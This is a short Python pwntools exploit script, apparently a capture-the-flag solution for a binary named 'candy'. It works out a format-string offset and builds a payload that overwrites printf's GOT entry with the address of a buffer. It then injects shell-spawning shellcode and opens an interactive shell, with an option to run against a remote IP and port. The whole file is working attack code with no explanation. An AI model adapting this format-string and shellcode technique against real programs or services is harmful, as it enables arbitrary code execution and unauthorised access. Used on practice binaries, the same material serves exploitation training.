from pwn import *

context.arch = "amd64"
context.log_level = "debug"

if args['REMOTE']:
    io = remote('IP',port)
else:
    io = process("./candy")

elf = ELF("./candy")

def exec_fmt(pad):
    io = process("./candy")
    io.sendline(b"2")
    io.send(pad)
    info = io.recv()
    io.close()
    return info


fmt = FmtStr(exec_fmt)
offset = fmt.offset
print("offset ===> ", offset)

pad = fmtstr_payload(offset, {elf.got["printf"]: elf.sym["name"]})

io.sendlineafter(b"Command:", b"1")
io.send(asm(shellcraft.sh()))

io.sendlineafter(b"Command:", b"2")
io.sendlineafter(b"flag!\n", pad)

io.interactive()
